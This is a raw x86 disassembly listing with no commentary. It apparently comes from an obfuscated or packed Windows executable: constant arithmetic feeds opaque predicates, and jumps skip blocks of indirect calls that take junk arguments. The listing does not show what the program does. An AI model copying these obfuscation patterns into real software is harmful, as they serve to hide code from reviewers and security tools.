  41f752:	mov    ecx,DWORD PTR [ecx]
  41f754:	lea    eax,[ecx+eax*1+0x28]
  41f758:	mov    eax,DWORD PTR [eax]
  41f75a:	add    DWORD PTR [esp+0x60],eax
  41f75e:	mov    DWORD PTR [esp+0x18],0x127
  41f766:	mov    DWORD PTR [esp+0x10],0x421a
  41f76e:	mov    eax,DWORD PTR [esp+0x10]
  41f772:	and    eax,0xffffc244
  41f777:	add    eax,DWORD PTR [esp+0x18]
  41f77b:	and    eax,0xfffffe5a
  41f780:	sub    eax,0x2ae1
  41f785:	and    eax,0x6f90
  41f78a:	mov    DWORD PTR [esp+0x18],eax
  41f78e:	mov    DWORD PTR [esp+0x10],0x1515
  41f796:	mov    eax,DWORD PTR [esp+0x10]
  41f79a:	mov    ecx,DWORD PTR [esp+0x18]
  41f79e:	or     eax,0x7113
  41f7a3:	add    eax,0x3d6a
  41f7a8:	cmp    ecx,eax
  41f7aa:	je     0x41f89a
  41f7b0:	mov    eax,DWORD PTR [esp+0x54]
  41f7b4:	mov    edx,DWORD PTR [esp+0x20]
  41f7b8:	mov    edi,DWORD PTR [esp+0x24]
  41f7bc:	xor    ecx,ecx
  41f7be:	shld   ecx,eax,0x2
  41f7c2:	shl    eax,0x2
  41f7c5:	xor    eax,ebx
  41f7c7:	xor    ecx,esi
  41f7c9:	cmp    eax,edx
  41f7cb:	jne    0x41f7d9
  41f7d1:	cmp    ecx,edi
  41f7d3:	je     0x41f853
  41f7d9:	mov    eax,DWORD PTR [esp+0x58]
  41f7dd:	mov    eax,DWORD PTR [esp+0x58]
  41f7e1:	mov    eax,DWORD PTR [esp+0x58]
  41f7e5:	mov    ecx,DWORD PTR [esp+0x58]
  41f7e9:	xor    eax,0xa3e69a9f
  41f7ee:	xor    ecx,0x1
  41f7f1:	shr    eax,0x2
  41f7f4:	shl    ecx,0x1e
  41f7f7:	or     eax,ecx
  41f7f9:	xor    ecx,ecx
  41f7fb:	shld   ecx,eax,0x2
  41f7ff:	shl    eax,0x2
  41f802:	xor    eax,ebx
  41f804:	xor    ecx,esi
  41f806:	cmp    eax,0xba699577
  41f80b:	jne    0x41f819
  41f811:	cmp    ecx,esi
  41f813:	je     0x41f89a
  41f819:	mov    eax,DWORD PTR [esp+0x68]
  41f81d:	cdq    
  41f81e:	mov    eax,DWORD PTR [esp+0x68]
  41f822:	mov    ecx,edx
  41f824:	cdq    
  41f825:	shld   edx,eax,0x2
  41f829:	shr    ecx,0x1e
  41f82c:	xor    edi,edi
  41f82e:	shl    eax,0x2
  41f831:	or     eax,ecx
  41f833:	or     edx,edi
  41f835:	mov    ecx,edx
  41f837:	mov    edx,DWORD PTR [esp+0x20]
  41f83b:	xor    eax,ebx
  41f83d:	xor    ecx,esi
  41f83f:	mov    esi,DWORD PTR [esp+0x24]
  41f843:	cmp    edx,eax
  41f845:	jne    0x41f853
  41f84b:	cmp    esi,ecx
  41f84d:	je     0x41f89a
  41f853:	push   DWORD PTR ds:0x422358
  41f859:	push   DWORD PTR ds:0x4220ec
  41f85f:	mov    eax,ds:0x422268
  41f864:	mov    eax,DWORD PTR [eax+0x1a4]
  41f86a:	push   DWORD PTR [eax]
  41f86c:	mov    eax,DWORD PTR [esp+0x6c]
  41f870:	call   eax
  41f872:	mov    ecx,DWORD PTR ds:0x422268
  41f878:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41f87e:	mov    DWORD PTR [ecx],eax
  41f880:	mov    eax,ds:0x422268
  41f885:	push   0x4
  41f887:	add    eax,0x1dc
  41f88c:	push   eax
  41f88d:	lea    eax,[esp+0x94]
  41f894:	push   eax
  41f895:	call   0x41d37f
  41f89a:	mov    eax,DWORD PTR [esp+0x8c]
  41f8a1:	mov    eax,DWORD PTR [eax]
  41f8a3:	pop    edi
  41f8a4:	pop    esi
  41f8a5:	pop    ebx
  41f8a6:	mov    esp,ebp
  41f8a8:	pop    ebp
  41f8a9:	ret    0xc
  41f8ac:	push   ebp
  41f8ad:	mov    ebp,esp
  41f8af:	sub    esp,0x23c
  41f8b5:	cmp    DWORD PTR ds:0x4228c2,0x0
  41f8bc:	mov    DWORD PTR ds:0x42297a,0x7f83
  41f8c6:	mov    DWORD PTR ds:0x4228d6,0x6307
  41f8d0:	movzx  ecx,BYTE PTR ds:0x4228ba
  41f8d7:	jmp    0x41f94d
  41f8dc:	mov    eax,0x73d2
  41f8e1:	ja     0x41f92d
  41f8e7:	push   0x7572
  41f8ec:	push   0x3356
  41f8f1:	push   DWORD PTR [ebp-0x18]
  41f8f4:	call   DWORD PTR ds:0x42a08c
  41f8fa:	movzx  ecx,WORD PTR ds:0x4228c6
  41f901:	sub    DWORD PTR ds:0x42289e,ecx
  41f907:	add    DWORD PTR ds:0x42298a,0x51b4
  41f911:	xor    DWORD PTR ds:0x4228ae,0x409b
  41f91b:	mov    ecx,DWORD PTR ds:0x4229a2
  41f921:	or     ecx,DWORD PTR ds:0x42293e
  41f927:	mov    DWORD PTR ds:0x4229a2,ecx
  41f92d:	sbb    ecx,DWORD PTR ds:0x4229d2
  41f933:	sbb    DWORD PTR ds:0x422926,0x11d6
  41f93d:	mov    DWORD PTR ds:0x4228ca,0x27b8
  41f947:	sbb    DWORD PTR ds:0x422976,edi
  41f94d:	push   ebx
  41f94e:	and    eax,ecx
  41f950:	push   esi
  41f951:	movzx  ecx,WORD PTR ds:0x42293a
  41f958:	and    DWORD PTR ds:0x42292e,ecx
  41f95e:	push   edi
  41f95f:	xor    eax,eax
  41f961:	mov    DWORD PTR [ebp-0x50],0x1
  41f968:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41f972:	mov    DWORD PTR [ebp-0xb8],0x1
  41f97c:	or     eax,0x7a0d
  41f981:	mov    ecx,DWORD PTR [ebp-0xb8]
  41f987:	cmp    DWORD PTR ds:0x4228aa,0x0
  41f98e:	mov    DWORD PTR ds:0x4228ea,0x1a45
  41f998:	mov    DWORD PTR ds:0x422906,0x738a
  41f9a2:	mov    DWORD PTR ds:0x42290a,edx
  41f9a8:	mov    DWORD PTR ds:0x42295a,0x6016
  41f9b2:	jmp    0x41fab5
  41f9b7:	movzx  eax,BYTE PTR ds:0x422986
  41f9be:	mov    DWORD PTR ds:0x422976,ecx
  41f9c4:	jae    0x41fa0b
  41f9ca:	push   DWORD PTR [ebp-0x10]
  41f9cd:	push   0x88a2
  41f9d2:	push   DWORD PTR [ebp-0x14]
  41f9d5:	push   0x19f9
  41f9da:	push   DWORD PTR [ebp-0x10]
  41f9dd:	push   0x407d
  41f9e2:	push   DWORD PTR [ebp-0x28]
  41f9e5:	push   0x5ee1
  41f9ea:	push   0x7b11
  41f9ef:	push   DWORD PTR [ebp-0x20]
  41f9f2:	push   DWORD PTR [ebp-0x24]
  41f9f5:	call   DWORD PTR ds:0x42a1b8
  41f9fb:	mov    DWORD PTR ds:0x4228ce,0x1a48
  41fa05:	adc    DWORD PTR ds:0x42290a,ebx
  41fa0b:	adc    DWORD PTR ds:0x422956,0x4228f2
  41fa15:	adc    DWORD PTR ds:0x42296a,0x42288e
  41fa1f:	cmp    DWORD PTR ds:0x422996,0x0
  41fa26:	mov    DWORD PTR ds:0x422926,0x4d3f
  41fa30:	mov    DWORD PTR ds:0x42299a,0x151a
  41fa3a:	mov    DWORD PTR ds:0x422896,0x407
  41fa44:	mov    DWORD PTR ds:0x422956,0x35c9
  41fa4e:	jmp    0x41fab5
  41fa53:	mov    eax,ds:0x42296e
  41fa58:	jne    0x41fa8f
  41fa5e:	push   DWORD PTR [ebp-0x18]
  41fa61:	call   DWORD PTR ds:0x42a1bc
  41fa67:	xor    DWORD PTR ds:0x42292e,0x4228d2
  41fa71:	xor    DWORD PTR ds:0x4229a6,0x7795
  41fa7b:	xor    DWORD PTR ds:0x42296e,0x5b89
  41fa85:	add    DWORD PTR ds:0x4228a6,0x3dfd
  41fa8f:	sub    DWORD PTR ds:0x42298e,0x1198
  41fa99:	adc    DWORD PTR ds:0x4228ea,0x422902
  41faa3:	add    DWORD PTR ds:0x4229c6,0x43e7
  41faad:	xor    DWORD PTR ds:0x422902,ebx
  41fab3:	neg    eax
  41fab5:	mov    eax,0x584
  41faba:	sub    DWORD PTR ds:0x422976,0x422906
  41fac4:	xor    edx,edx
  41fac6:	div    ecx
  41fac8:	cmp    DWORD PTR ds:0x42288a,0x0
  41facf:	mov    ecx,0x7438
  41fad4:	mov    DWORD PTR ds:0x4229a6,0x7ff6
  41fade:	mov    ecx,0x49e3
  41fae3:	mov    DWORD PTR ds:0x42296e,0x37ce
  41faed:	jmp    0x41fb3b
  41faf2:	mov    DWORD PTR ds:0x4228fa,0x7ac
  41fafc:	jb     0x41fb29
  41fb02:	push   0x18bc
  41fb07:	call   DWORD PTR ds:0x42a090
  41fb0d:	sbb    DWORD PTR ds:0x4228f2,0xcbd
  41fb17:	sbb    ecx,DWORD PTR ds:0x4228e2
  41fb1d:	sub    DWORD PTR ds:0x42299e,ecx
  41fb23:	and    ecx,DWORD PTR ds:0x4228a6
  41fb29:	or     ecx,0x1fe6
  41fb2f:	add    DWORD PTR ds:0x4228f6,ebx
  41fb35:	adc    ecx,0x2c1d
  41fb3b:	imul   eax,eax,0x51d4
  41fb41:	cmp    DWORD PTR ds:0x4228a6,0x0
  41fb48:	mov    DWORD PTR ds:0x4228da,ecx
  41fb4e:	movzx  ecx,WORD PTR ds:0x42297e
  41fb55:	mov    DWORD PTR ds:0x422962,ebx
  41fb5b:	jmp    0x41fba5
  41fb60:	mov    DWORD PTR ds:0x4228e2,edx
  41fb66:	ja     0x41fb93
  41fb6c:	push   0x4229a2
  41fb71:	push   DWORD PTR [ebp-0x28]
  41fb74:	push   DWORD PTR [ebp-0x20]
  41fb77:	call   DWORD PTR ds:0x42a094
  41fb7d:	mov    DWORD PTR ds:0x4228a6,0x230b
  41fb87:	not    DWORD PTR ds:0x422976
  41fb8d:	sub    DWORD PTR ds:0x422986,edi
  41fb93:	sub    ecx,DWORD PTR ds:0x422982
  41fb99:	adc    ecx,DWORD PTR ds:0x4229be
  41fb9f:	sub    ecx,DWORD PTR ds:0x4228fe
  41fba5:	mov    ecx,DWORD PTR [ebp-0xbc]
  41fbab:	xor    eax,ecx
  41fbad:	sbb    DWORD PTR ds:0x422892,ebx
  41fbb3:	and    eax,0x4c09
  41fbb8:	mov    ecx,DWORD PTR [ebp-0x50]
  41fbbb:	and    DWORD PTR ds:0x42296e,0x422982
  41fbc5:	xor    edx,edx
  41fbc7:	or     DWORD PTR ds:0x422956,0x4802
  41fbd1:	div    ecx
  41fbd3:	add    DWORD PTR ds:0x4229be,0x5f4b
  41fbdd:	sub    eax,0x401
  41fbe2:	mov    ecx,DWORD PTR ds:0x4228de
  41fbe8:	xor    DWORD PTR ds:0x422996,ecx
  41fbee:	mov    DWORD PTR [ebp-0x90],eax
  41fbf4:	cmp    DWORD PTR ds:0x4228b6,0x0
  41fbfb:	mov    DWORD PTR ds:0x4228e6,edx
  41fc01:	not    ecx
  41fc03:	movzx  ecx,WORD PTR ds:0x4228d6
  41fc0a:	jmp    0x41fc3a
  41fc0f:	not    eax
  41fc11:	jae    0x41fc28
  41fc17:	push   DWORD PTR [ebp-0x10]
  41fc1a:	call   DWORD PTR ds:0x42a2d0
  41fc20:	add    ecx,edx
  41fc22:	and    edx,0x53dd
  41fc28:	add    DWORD PTR ds:0x42297e,0x1518
  41fc32:	and    edx,edx
  41fc34:	neg    DWORD PTR ds:0x422986
  41fc3a:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41fc44:	or     eax,eax
  41fc46:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41fc4d:	cmp    DWORD PTR ds:0x42298e,0x0
  41fc54:	mov    DWORD PTR ds:0x422932,0x7de
  41fc5e:	mov    edx,0x2edc
  41fc63:	mov    DWORD PTR ds:0x422946,ebx
  41fc69:	jmp    0x41fcd0
  41fc6e:	mov    DWORD PTR ds:0x4228b6,0xeb6
  41fc78:	mov    ecx,DWORD PTR ds:0x422912
  41fc7e:	ja     0x41fcb9
  41fc84:	push   0x8c9b
  41fc89:	call   DWORD PTR ds:0x42a2d4
  41fc8f:	and    DWORD PTR ds:0x4228aa,0x7f6
  41fc99:	xor    edx,edx
  41fc9b:	add    edx,DWORD PTR ds:0x422916
  41fca1:	add    edx,DWORD PTR ds:0x422922
  41fca7:	mov    DWORD PTR ds:0x422916,edx
  41fcad:	mov    ecx,DWORD PTR ds:0x42297e
  41fcb3:	xor    DWORD PTR ds:0x42294a,ecx
  41fcb9:	dec    edx
  41fcba:	sub    DWORD PTR ds:0x422946,0x422986
  41fcc4:	mov    edx,DWORD PTR ds:0x4228aa
  41fcca:	sub    DWORD PTR ds:0x422962,edx
  41fcd0:	mov    DWORD PTR [ebp-0xb4],0x3842
  41fcda:	mov    DWORD PTR ds:0x422906,0x649c
  41fce4:	mov    eax,DWORD PTR [ebp-0x4c]
  41fce7:	adc    edx,0x487c
  41fced:	add    eax,DWORD PTR [ebp-0xb4]
  41fcf3:	neg    edx
  41fcf5:	xor    eax,0x2e02
  41fcfa:	xor    edx,edx
  41fcfc:	xor    eax,0x7294
  41fd01:	dec    ecx
  41fd02:	imul   eax,eax,0x68f3
  41fd08:	sub    edx,edx
  41fd0a:	mov    ecx,DWORD PTR [ebp-0x8c]
  41fd10:	and    eax,ecx
  41fd12:	or     edx,0x18d0
  41fd18:	sub    eax,0x2818
  41fd1d:	and    DWORD PTR ds:0x4229aa,0x187b
  41fd27:	mov    DWORD PTR [ebp-0xe8],eax
  41fd2d:	mov    DWORD PTR [ebp-0x70],0x6f89
  41fd34:	cmp    DWORD PTR ds:0x4229ce,0x0
  41fd3b:	mov    DWORD PTR ds:0x4228d6,0x3c7
  41fd45:	mov    DWORD PTR ds:0x422942,edi
  41fd4b:	movzx  edx,BYTE PTR ds:0x4228aa
  41fd52:	jmp    0x41fda0
  41fd57:	mov    DWORD PTR ds:0x422966,ecx
  41fd5d:	jae    0x41fd96
  41fd63:	push   0x8302
  41fd68:	push   0x7bd4
  41fd6d:	push   0x2714
  41fd72:	push   DWORD PTR [ebp-0x28]
  41fd75:	push   0x400000
  41fd7a:	call   DWORD PTR ds:0x42a2d8
  41fd80:	add    ecx,0x75a1
  41fd86:	or     edx,DWORD PTR ds:0x42298e
  41fd8c:	xor    DWORD PTR ds:0x42289e,0x5495
  41fd96:	adc    ecx,edx
  41fd98:	sbb    ecx,DWORD PTR ds:0x422992
  41fd9e:	not    edx
  41fda0:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41fdaa:	adc    DWORD PTR ds:0x4228da,0x189a
  41fdb4:	mov    DWORD PTR [ebp-0x120],0x3c77
  41fdbe:	cmp    DWORD PTR ds:0x4229d2,0x0
  41fdc5:	mov    DWORD PTR ds:0x422962,0x782b
  41fdcf:	mov    edx,0x3512
  41fdd4:	jmp    0x41fe17
  41fdd9:	mov    DWORD PTR ds:0x422966,0x45e0
  41fde3:	mov    DWORD PTR ds:0x42298a,ebx
  41fde9:	jle    0x41fe08
  41fdef:	push   0x4f01
  41fdf4:	call   DWORD PTR ds:0x42a2dc
  41fdfa:	or     edx,ecx
  41fdfc:	adc    edx,DWORD PTR ds:0x4228fa
  41fe02:	sub    DWORD PTR ds:0x422956,edi
  41fe08:	dec    ecx
  41fe09:	inc    DWORD PTR ds:0x4228c2
  41fe0f:	adc    ecx,ecx
  41fe11:	sub    edx,0x2d38
  41fe17:	mov    DWORD PTR [ebp-0x2c],0x2129
  41fe1e:	movzx  edx,WORD PTR ds:0x42290e
  41fe25:	sbb    edx,DWORD PTR ds:0x4229a6
  41fe2b:	mov    DWORD PTR ds:0x42290e,edx
  41fe31:	mov    eax,DWORD PTR [ebp-0x2c]
  41fe34:	imul   eax,eax,0x1ada
  41fe3a:	mov    ecx,DWORD PTR [ebp-0x120]
  41fe40:	and    DWORD PTR ds:0x422892,ebx
  41fe46:	imul   ecx,ecx,0x53ae
  41fe4c:	sbb    edx,DWORD PTR ds:0x422982
  41fe52:	imul   ecx,ecx,0x7447
  41fe58:	mov    edx,DWORD PTR [ebp-0xd0]
  41fe5e:	inc    DWORD PTR ds:0x4228be
  41fe64:	and    ecx,edx
  41fe66:	sub    edx,DWORD PTR ds:0x4229a6
  41fe6c:	or     ecx,0x2a20
  41fe72:	cmp    DWORD PTR ds:0x4228ba,0x0
  41fe79:	mov    DWORD PTR ds:0x422906,edi
  41fe7f:	mov    DWORD PTR ds:0x4229d2,edx
  41fe85:	mov    DWORD PTR ds:0x4228be,edx
  41fe8b:	mov    edx,DWORD PTR ds:0x422956
  41fe91:	jmp    0x41ff1a
  41fe96:	mov    DWORD PTR ds:0x4228ba,0x5711
  41fea0:	mov    DWORD PTR ds:0x4228ba,edi
  41fea6:	ja     0x41fee0
  41feac:	push   0x3098
  41feb1:	push   0x4227d9
  41feb6:	push   0x4227af
  41febb:	push   0x4227eb
  41fec0:	call   DWORD PTR ds:0x42a1c0
  41fec6:	mov    edx,DWORD PTR ds:0x4229ae
  41fecc:	adc    edx,DWORD PTR ds:0x4228c6
  41fed2:	mov    DWORD PTR ds:0x4229ae,edx
  41fed8:	not    edx
  41feda:	xor    edx,DWORD PTR ds:0x422996
  41fee0:	mov    edx,DWORD PTR ds:0x422af2
  41fee6:	mov    edx,DWORD PTR [edx]
  41fee8:	add    DWORD PTR ds:0x422936,edx
  41feee:	mov    edx,DWORD PTR ds:0x422892
  41fef4:	and    DWORD PTR ds:0x422976,edx
  41fefa:	movzx  edx,WORD PTR ds:0x4229ae
  41ff01:	add    DWORD PTR ds:0x4229d2,edx
  41ff07:	movzx  edx,WORD PTR ds:0x4229aa
  41ff0e:	xor    edx,DWORD PTR ds:0x42289a
  41ff14:	mov    DWORD PTR ds:0x4229aa,edx
  41ff1a:	mov    edx,DWORD PTR [ebp-0x70]
  41ff1d:	xor    ecx,edx
  41ff1f:	add    DWORD PTR ds:0x4228ae,0x42293e
  41ff29:	mov    edx,DWORD PTR [ebp+0x14]
  41ff2c:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41ff33:	add    DWORD PTR ds:0x422986,0x422936
  41ff3d:	lea    eax,[ecx+eax*1-0x45a1]
  41ff44:	sub    ecx,0x1147
  41ff4a:	mov    DWORD PTR [ebp-0xb0],eax
  41ff50:	mov    DWORD PTR [ebp-0x11c],0x303f
  41ff5a:	mov    DWORD PTR [ebp-0x98],0x51a9
  41ff64:	and    DWORD PTR ds:0x4228ee,0x28c
  41ff6e:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41ff78:	mov    eax,DWORD PTR [ebp-0xcc]
  41ff7e:	xor    eax,0x6f65
  41ff83:	movzx  ecx,WORD PTR ds:0x42296a
  41ff8a:	or     DWORD PTR ds:0x422986,ecx
  41ff90:	mov    ecx,DWORD PTR [ebp-0x98]
  41ff96:	or     eax,ecx
  41ff98:	xor    DWORD PTR ds:0x422922,0x9d1
  41ffa2:	add    eax,0x161e
  41ffa7:	mov    ecx,DWORD PTR [ebp-0x11c]
  41ffad:	add    DWORD PTR ds:0x422996,0x5a44
  41ffb7:	or     eax,ecx
  41ffb9:	and    DWORD PTR ds:0x422922,ebx
  41ffbf:	add    eax,0x1cca
  41ffc4:	cmp    DWORD PTR ds:0x422996,0x0
  41ffcb:	movzx  ecx,WORD PTR ds:0x4229b6
  41ffd2:	mov    DWORD PTR ds:0x4228ca,ecx
  41ffd8:	mov    ecx,0x6e0d
  41ffdd:	jmp    0x420051
  41ffe2:	mov    ecx,0x4420
  41ffe7:	mov    DWORD PTR ds:0x4228d2,0xbd6
  41fff1:	jb     0x42003b
  41fff7:	push   DWORD PTR [ebp-0x14]
  41fffa:	push   DWORD PTR [ebp-0x24]
  41fffd:	push   0x422797
  420002:	push   0x81c6
  420007:	push   0x5863
  42000c:	push   0x7a14
  420011:	push   DWORD PTR [ebp-0x14]
  420014:	push   0x36c1
  420019:	call   DWORD PTR ds:0x42a1c4
  42001f:	mov    ecx,DWORD PTR ds:0x4229b6
  420025:	add    DWORD PTR ds:0x4228da,ecx
  42002b:	add    DWORD PTR ds:0x42288e,0x26c4
  420035:	add    ecx,0x5f2e
  42003b:	sbb    DWORD PTR ds:0x422972,edi
  420041:	add    DWORD PTR ds:0x42289e,edx
  420047:	sbb    DWORD PTR ds:0x4228a2,0x42293e
  420051:	xor    eax,0x96c9
  420056:	mov    DWORD PTR [ebp-0x38],eax
  420059:	mov    DWORD PTR [ebp-0x118],0x6083
  420063:	sbb    ecx,0x49d9
  420069:	mov    DWORD PTR [ebp-0x88],0x556
  420073:	mov    DWORD PTR [ebp-0x140],0x6c7d
  42007d:	mov    eax,DWORD PTR [ebp-0x140]
  420083:	cmp    DWORD PTR ds:0x42297e,0x0
  42008a:	mov    DWORD PTR ds:0x4229ba,0x1d24
  420094:	mov    ecx,DWORD PTR ds:0x42293e
  42009a:	movzx  ecx,WORD PTR ds:0x422986
  4200a1:	jmp    0x4200dd
  4200a6:	mov    DWORD PTR ds:0x4228be,0x28a1
  4200b0:	je     0x4200d1
  4200b6:	push   DWORD PTR [ebp-0x18]
  4200b9:	call   DWORD PTR ds:0x42a2e0
  4200bf:	add    DWORD PTR ds:0x4228ce,edi
  4200c5:	and    DWORD PTR ds:0x4228ce,ebx
  4200cb:	add    ecx,0x4241
  4200d1:	xor    ecx,0x765e
  4200d7:	sub    DWORD PTR ds:0x4229d2,edi
  4200dd:	add    eax,0x5af8
  4200e2:	mov    ecx,DWORD PTR [ebp-0x88]
  4200e8:	xor    DWORD PTR ds:0x4229c2,0x1fa8
  4200f2:	sub    eax,ecx
  4200f4:	cmp    DWORD PTR ds:0x4229d2,0x0
  4200fb:	mov    ecx,0x1395
  420100:	mov    ecx,DWORD PTR ds:0x4228e6
  420106:	mov    DWORD PTR ds:0x4228f2,ebx
  42010c:	jmp    0x420176
  420111:	mov    DWORD PTR ds:0x422972,0x6a84
  42011b:	mov    DWORD PTR ds:0x4228ea,0x62f2
  420125:	jb     0x42014f
  42012b:	push   0x3346
  420130:	call   DWORD PTR ds:0x42a1c8
  420136:	add    ecx,0x6b03
  42013c:	movzx  ecx,WORD PTR ds:0x422912
  420143:	add    DWORD PTR ds:0x42288a,ecx
  420149:	and    ecx,DWORD PTR ds:0x42292e
  42014f:	sub    DWORD PTR ds:0x422936,edi
  420155:	xor    ecx,ecx
  420157:	xor    ecx,DWORD PTR ds:0x422962
  42015d:	add    ecx,DWORD PTR ds:0x422966
  420163:	mov    DWORD PTR ds:0x422962,ecx
  420169:	movzx  ecx,WORD PTR ds:0x42290e
  420170:	or     DWORD PTR ds:0x42294a,ecx
  420176:	mov    ecx,DWORD PTR [ebp-0x118]
  42017c:	xor    DWORD PTR ds:0x4228ca,0x60cf
  420186:	lea    eax,[eax+ecx*1+0x68dc]
  42018d:	not    ecx
  42018f:	or     eax,0x52f6
  420194:	xor    ecx,0x5502
  42019a:	sub    eax,0x1dbfe
  42019f:	and    DWORD PTR ds:0x4228ee,0x5b35
  4201a9:	mov    DWORD PTR [ebp-0xac],eax
  4201af:	add    DWORD PTR ds:0x422976,0x4861
  4201b9:	mov    DWORD PTR [ebp-0x6c],0x4b56
  4201c0:	mov    DWORD PTR [ebp-0x100],0x49f7
  4201ca:	mov    eax,DWORD PTR [ebp-0x100]
  4201d0:	and    ecx,0x658f
  4201d6:	add    eax,0x7b60
  4201db:	imul   eax,eax,0x5ea
  4201e1:	mov    ecx,DWORD PTR [ebp-0x6c]
  4201e4:	and    DWORD PTR ds:0x42292e,0x4229c6
  4201ee:	imul   eax,ecx
  4201f1:	xor    edx,edx
  4201f3:	and    DWORD PTR ds:0x42299a,ecx
  4201f9:	mov    ecx,0x3218d
  4201fe:	div    ecx
  420200:	adc    DWORD PTR ds:0x42293a,0x4228f2
  42020a:	sub    eax,0x24c1
  42020f:	cmp    DWORD PTR ds:0x42296e,0x0
  420216:	mov    DWORD PTR ds:0x4228f6,0x5f97
  420220:	mov    ecx,DWORD PTR ds:0x422992
  420226:	jmp    0x420272
  42022b:	mov    DWORD PTR ds:0x42290e,0x3c76
  420235:	not    DWORD PTR ds:0x4228ae
  42023b:	jbe    0x420262
  420241:	push   0x3dff
  420246:	call   DWORD PTR ds:0x42a098
  42024c:	not    ecx
  42024e:	add    DWORD PTR ds:0x4229ca,0x7a9c
  420258:	and    DWORD PTR ds:0x422906,0x510
  420262:	xor    DWORD PTR ds:0x4228ae,ebx
  420268:	adc    DWORD PTR ds:0x422902,0x422986
  420272:	mov    DWORD PTR [ebp-0xa8],eax
  420278:	cmp    DWORD PTR ds:0x422916,0x0
  42027f:	mov    ecx,0x7594
  420284:	mov    ecx,0x61a
  420289:	movzx  ecx,WORD PTR ds:0x4229c6
  420290:	jmp    0x4202e8
  420295:	mov    eax,ds:0x42294a
  42029a:	mov    DWORD PTR ds:0x4228f6,edi
  4202a0:	jbe    0x4202d4
  4202a6:	push   0x1
  4202a8:	push   0x158d
  4202ad:	push   DWORD PTR [ebp-0x14]
  4202b0:	push   0x1baf
  4202b5:	call   DWORD PTR ds:0x42a2e4
  4202bb:	add    ecx,0x4150
  4202c1:	adc    ecx,0x4614
  4202c7:	movzx  ecx,BYTE PTR ds:0x422892
  4202ce:	and    DWORD PTR ds:0x4228a2,ecx
  4202d4:	sub    ecx,ecx
  4202d6:	mov    ecx,DWORD PTR ds:0x42289e
  4202dc:	add    ecx,DWORD PTR ds:0x42298a
  4202e2:	mov    DWORD PTR ds:0x42289e,ecx
  4202e8:	mov    DWORD PTR [ebp-0x84],0x2c40
  4202f2:	mov    DWORD PTR [ebp-0x18],0x6013
  4202f9:	mov    DWORD PTR [ebp-0x80],0xc
  420300:	xor    ecx,ecx
  420302:	add    ecx,DWORD PTR ds:0x4228be
  420308:	add    DWORD PTR ds:0x4229ce,ecx
  42030e:	mov    eax,DWORD PTR [ebp-0x18]
  420311:	or     ecx,DWORD PTR ds:0x42296a
  420317:	mov    ecx,DWORD PTR [ebp-0x80]
  42031a:	xor    DWORD PTR ds:0x422912,0x4229b6
  420324:	xor    edx,edx
  420326:	div    ecx
  420328:	sub    ecx,DWORD PTR ds:0x42288a
  42032e:	imul   eax,eax,0x4312
  420334:	cmp    DWORD PTR ds:0x42290a,0x0
  42033b:	mov    DWORD PTR ds:0x42289a,0x25f4
  420345:	mov    DWORD PTR ds:0x4228de,0x6ae8
  42034f:	mov    DWORD PTR ds:0x422936,0x199e
  420359:	jmp    0x42042c
  42035e:	mov    DWORD PTR ds:0x4228e6,0x15fd
  420368:	jb     0x4203a2
  42036e:	push   0x42293a
  420373:	push   0x1346
  420378:	push   DWORD PTR [ebp-0x18]
  42037b:	push   0x747f
  420380:	call   DWORD PTR ds:0x42a1cc
  420386:	and    ecx,DWORD PTR ds:0x42299a
  42038c:	mov    ecx,DWORD PTR ds:0x42288a
  420392:	xor    DWORD PTR ds:0x4229ca,ecx
  420398:	sbb    DWORD PTR ds:0x422926,0xf78
  4203a2:	not    DWORD PTR ds:0x4228ca
  4203a8:	adc    DWORD PTR ds:0x422972,ebx
  4203ae:	cmp    DWORD PTR ds:0x4228f2,0x0
  4203b5:	mov    DWORD PTR ds:0x4229b2,0x21f7
  4203bf:	mov    DWORD PTR ds:0x4229a6,ebx
  4203c5:	mov    DWORD PTR ds:0x4228aa,0x33dc
  4203cf:	jmp    0x42042c
  4203d4:	mov    DWORD PTR ds:0x42288a,0x359f
  4203de:	mov    DWORD PTR ds:0x42297a,0x36a8
  4203e8:	je     0x420410
  4203ee:	call   DWORD PTR ds:0x42a2e8
  4203f4:	or     ecx,0xc82
  4203fa:	adc    DWORD PTR ds:0x4229ce,0x7856
  420404:	neg    DWORD PTR ds:0x4228e6
  42040a:	sub    ecx,0x6a4f
  420410:	or     ecx,DWORD PTR ds:0x42290e
  420416:	adc    ecx,DWORD PTR ds:0x422906
  42041c:	xor    DWORD PTR ds:0x42290a,0x3a36
  420426:	adc    ecx,DWORD PTR ds:0x422972
  42042c:	add    eax,0x5abe
  420431:	dec    ecx
  420432:	mov    ecx,DWORD PTR [ebp-0x84]
  420438:	sbb    DWORD PTR ds:0x4228ba,0x6729
  420442:	xor    eax,ecx
  420444:	movzx  ecx,WORD PTR ds:0x42288e
  42044b:	sub    ecx,DWORD PTR ds:0x4228ce
  420451:	mov    DWORD PTR ds:0x42288e,ecx
  420457:	xor    edx,edx
  420459:	mov    ecx,0x5ae
  42045e:	div    ecx
  420460:	and    DWORD PTR ds:0x42289e,ebx
  420466:	xor    eax,0x5e8c
  42046b:	mov    DWORD PTR [ebp-0x48],eax
  42046e:	mov    DWORD PTR ds:0x4228ae,0x2632
  420478:	mov    DWORD PTR [ebp-0x13c],0x7b18
  420482:	and    eax,DWORD PTR ds:0x42291e
  420488:	mov    DWORD PTR [ebp-0x138],0x1169
  420492:	xor    eax,ecx
  420494:	mov    DWORD PTR [ebp-0x12c],0x1379
  42049e:	mov    eax,DWORD PTR [ebp-0x12c]
  4204a4:	mov    ecx,0x5856
  4204a9:	or     DWORD PTR ds:0x422922,0x661e
  4204b3:	sub    ecx,eax
  4204b5:	dec    eax
  4204b6:	shr    ecx,0x2
  4204b9:	sub    ecx,0x5be6
  4204bf:	cmp    DWORD PTR ds:0x42291e,0x0
  4204c6:	mov    DWORD PTR ds:0x422906,0x5702
  4204d0:	mov    DWORD PTR ds:0x4228b2,0x24ef
  4204da:	jmp    0x420539
  4204df:	mov    eax,ds:0x4228c6
  4204e4:	not    DWORD PTR ds:0x42296e
  4204ea:	jl     0x42051d
  4204f0:	push   0x5bb1
  4204f5:	push   0x4228e2
  4204fa:	push   0x2dbc
  4204ff:	call   DWORD PTR ds:0x42a09c
  420505:	add    DWORD PTR ds:0x422996,edx
